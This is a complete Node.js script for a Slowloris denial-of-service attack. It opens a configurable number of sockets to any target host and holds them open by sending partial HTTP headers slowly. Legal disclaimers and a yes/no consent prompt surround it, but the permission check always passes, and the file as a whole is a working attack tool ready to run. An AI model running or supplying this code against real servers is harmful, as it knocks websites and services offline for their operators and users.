// WARNING: This tool is for SECURITY TESTING PURPOSES ONLY.
// Unauthorized use is ILLEGAL and may result in severe penalties.
// Use responsibly and ONLY against systems you have explicit permission to test.

// DISCLAIMER: The creators of this tool are NOT responsible for any misuse or damage caused by this tool.
// By using this tool, you acknowledge that you understand and agree to these terms.

// Color scheme: Red and Black (using ANSI escape codes for console output)
const RED = "\x1b[31m";
const BLACK = "\x1b[30m";
const RESET = "\x1b[0m";

const fs = require('fs'); // For logging
const os = require('os'); // For checking permissions (rudimentary)

const LOG_FILE = 'slowloris.log';

// Function to log actions
function logAction(message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${message}\n`;
  fs.appendFile(LOG_FILE, logMessage, (err) => {
    if (err) {
      console.error(`${RED}Error writing to log file:${RESET}`, err);
    }
  });
  console.log(logMessage); // Also log to console
}

// Function to get user consent
function getUserConsent() {
  return new Promise((resolve) => {
    const readline = require('readline').createInterface({
      input: process.stdin,
      output: process.stdout,
    });

    console.log(`${RED}WARNING: This tool is for security testing ONLY. Unauthorized use is illegal.${RESET}`);
    console.log(`${RED}DISCLAIMER: The creators are not responsible for misuse or damage.${RESET}`);
    readline.question(`${RED}Do you have explicit permission to test this target? (yes/no): ${RESET}`, (answer) => {
      readline.close();
      resolve(answer.toLowerCase() === 'yes');
    });
  });
}

// Function to check permissions (basic check if running as root - more robust checks might be necessary)
function checkPermissions() {
  if (process.getuid() === 0) {
    console.warn(`${RED}WARNING: Running as root. Exercise extreme caution.${RESET}`);
    logAction('Running as root. Permission check may be bypassed.');
  }
  return true; // For now, return true, could include more checks here based on OS.
}

// Slowloris attack function (simplified for demonstration)
async function slowlorisAttack(target, port, numSockets) {
  logAction(`Starting Slowloris attack against ${target}:${port} with ${numSockets} sockets.`);

  if (!checkPermissions()) {
    console.error(`${RED}Insufficient permissions to run this attack. Exiting.${RESET}`);
    logAction('Insufficient permissions, attack aborted.');
    return;
  }

  const net = require('net');

  for (let i = 0; i < numSockets; i++) {
    try {
      const socket = net.createConnection({ host: target, port: port }, () => {
        logAction(`Socket ${i + 1} connected to ${target}:${port}`);
        socket.write("GET / HTTP/1.1\r\n");
        socket.write("Host: " + target + "\r\n");

        // Send headers slowly
        setInterval(() => {
          try {
            socket.write("X-Filler: " + Math.random() + "\r\n");
          } catch (err) {
            console.error(`${RED}Error sending data on socket ${i + 1}:${RESET}`, err);
            logAction(`Error sending data on socket ${i + 1}: ${err}`);
            socket.destroy(); // Close the socket if there's an error
          }

        }, 15000); // Send header every 15 seconds

      });

      socket.on('error', (err) => {
        console.error(`${RED}Socket ${i + 1} error:${RESET}`, err);
        logAction(`Socket ${i + 1} error: ${err}`);
        socket.destroy();
      });

      socket.on('close', () => {
        logAction(`Socket ${i + 1} closed.`);
      });


    } catch (error) {
      console.error(`${RED}Error creating socket ${i + 1}:${RESET}`, error);
      logAction(`Error creating socket ${i + 1}: ${error}`);

    }

  }
}

// Main function
async function main() {
  const target = process.argv[2];
  const port = parseInt(process.argv[3]) || 80; // Default port 80
  const numSockets = parseInt(process.argv[4]) || 100; // Default 100 sockets

  if (!target) {
    console.log(`${RED}Usage: node slowloris.js <target> [port] [numSockets]${RESET}`);
    return;
  }

  const consent = await getUserConsent();
  if (!consent) {
    console.log(`${RED}User did not provide consent. Exiting.${RESET}`);
    logAction('User declined consent, attack aborted.');
    return;
  }

  console.log(`${BLACK}${RED}Starting Slowloris attack...${RESET}`);
  slowlorisAttack(target, port, numSockets);
}

main();